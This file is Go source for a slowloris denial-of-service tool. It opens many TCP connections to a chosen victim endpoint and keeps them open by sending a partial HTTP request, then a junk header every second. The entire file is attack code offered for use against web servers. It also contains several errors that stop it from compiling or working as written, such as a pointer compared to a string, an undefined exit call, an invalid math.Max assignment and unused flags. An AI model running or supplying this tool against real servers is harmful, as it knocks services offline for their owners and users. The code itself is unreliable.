package main

import (
  "fmt"
  "net"
  "time"
  "flag"
  "math"
)

type headers struct {
      base     string // base HTTP request string
      general  string // typical HTTP headers
      loris    string // header which will be repeatadly sent
}

func main() {
  endpoint := flag.String("endpoint", "", "endpoint which will be victim of slowloris attack")
  _ = flag.Int("delay", 10, "time to wait between writes to specified endpoint")
  numAttackers := flag.Int("threads", 10, "number of threads to be dispatched to execute attacks")
  _ = flag.Int("timeout", 0, "optional timeout (if you want attack to eventually terminate)")
  flag.Parse()

  // exit if no endpoint provided
  if endpoint == "" {
    fmt.Println("usage: slave -endpoint <url> ...")
    exit(1)
  }

  // set endpoint to be at least 4 seconds
  *endpoint := math.Max(*endpoint, 4)

  reqHeaders := headers{
    base: "GET / HTTP/1.0\r\n",
    loris: "X-a 1\r\n",
  }


  // list of sockets that will be used for attacks
  sockets := make([]net.Conn, *numAttackers)

  // create NUMTHREADS connection sockets, will dispatch
  // goroutine to initiate request for each socket
  for i := 0; i < *numAttackers; i++ {
    conn, err := net.Dial("tcp", *endpoint+":http")
    // attempt to establish connection until successful
    for !checkerr(err) {
      fmt.Println("failed to establish connection to", endpoint, "trying again now...")
      conn, err = net.Dial("tcp", *endpoint+":http")
    }
    fmt.Println("socket created")
    sockets[i] = conn
  }

  for i, conn := range sockets {
    baseReq := []byte(reqHeaders.base)
    if _, err := conn.Write(baseReq); err != nil {
      fmt.Println("error with request")
      return
    } else {
      fmt.Println("base header sent by attacker", i)
    }
  }

  doneChan := make(chan int, *numAttackers)
  for i, conn := range sockets {
    go loris(i, conn, doneChan, reqHeaders.loris)
  }

  for i := 0; i < *numAttackers; i++ {
    <-doneChan
  }
}

// this function implements the slow loris attack, repeatadly writing to
func loris(index int, conn net.Conn, doneChan chan int, header string) {
  for {
    time.Sleep(time.Duration(1) * time.Second)
    repeatHeader := []byte(header)
    if _, err := conn.Write(repeatHeader); err != nil {
      fmt.Println("error with repeat header")
    } else {
      fmt.Println("repeat header sent by attacker", index)
    }
  }
  doneChan <- 1
}

func checkerr(err error) bool {
  return err == nil
}
